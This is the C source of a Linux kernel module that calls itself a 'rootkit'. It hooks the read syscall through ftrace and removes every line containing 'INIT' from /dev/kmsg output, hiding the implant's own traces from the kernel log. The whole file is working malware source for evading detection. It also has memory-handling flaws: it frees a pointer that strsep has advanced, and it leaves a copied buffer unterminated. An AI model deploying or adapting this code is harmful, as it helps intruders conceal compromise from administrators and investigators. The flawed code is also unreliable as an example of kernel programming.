#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "headers/ftrace_helper.h"

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs); // Pointer to the original read function

// Hooked function that intercepts the syscall read
static asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    int fd = regs->di;  // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si;  // Second argument: output buffer for user
    size_t count = regs->dx;  // Number of bytes to read
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    // Check if the fd is from /dev/kmsg
    file = fget(fd);  // Gets the file object corresponding to the fd
    if (file && strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0) {
        fput(file);  // Frees the file object after verification

        // Allocates a temporary buffer in kernel space
        kernel_buf = kmalloc(B_F, GFP_KERNEL);
        if (!kernel_buf) {
            printk(KERN_ERR "Failed to allocate temporary buffer.\n");
            return -ENOMEM;
        }

        // Calls the original function to read data from /dev/kmsg
        bytes_read = orig_read(regs);
        if (bytes_read < 0) {
            kfree(kernel_buf);
            return bytes_read;
        }

        // Copies data read from user space to the buffer in the kernel for processing
        if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
            kfree(kernel_buf);
            return -EFAULT;
        }

        // Create a temporary filtered buffer
        char *filtered_buf = kzalloc(B_F, GFP_KERNEL);
        if (!filtered_buf) {
            kfree(kernel_buf);
            return -ENOMEM;
        }

        char *line;
        size_t filtered_len = 0;

        while ((line = strsep(&kernel_buf, "\n")) != NULL) {
            if (!strstr(line, "INIT")) { // Skip lines containing "INIT"
                size_t len = strlen(line);

                // Ensure we don't exceed buffer size
                if (filtered_len + len + 1 < B_F) {
                    strlcat(filtered_buf, line, B_F);
                    filtered_len += len;

                    // Add a newline only if the line doesn't already end with one
                    if (filtered_len + 1 < B_F && (filtered_len == 0 || filtered_buf[filtered_len - 1] != '\n')) {
                        strlcat(filtered_buf, "\n", B_F);
                        filtered_len++;
                    }
                }
            }
        }

        // Null-terminate the filtered buffer
        filtered_buf[filtered_len] = '\0';

        // Copy the filtered buffer back to userspace
        if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
            printk(KERN_ERR "Failed to copy filtered buffer to user space\n");
            kfree(kernel_buf);
            kfree(filtered_buf);
            return -EFAULT;  // Return error if copying fails
        }

        kfree(kernel_buf);
        kfree(filtered_buf);
        return filtered_len;
    }

    if (file)
        fput(file);  // Frees the file object if it is not /dev/kmsg

    return orig_read(regs);  // Calls the original reading function if it is not /dev/kmsg
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

void install_hook(void) {
    int ret;
    ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret) {
        printk(KERN_ERR "Failed to install ftrace hooks\n");
        return;
    }

    printk(KERN_INFO "rootkit Ftrace hooks installed\n");
}

// Function to remove the hooks
void exit_hook(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Ftrace hooks removed\n");
}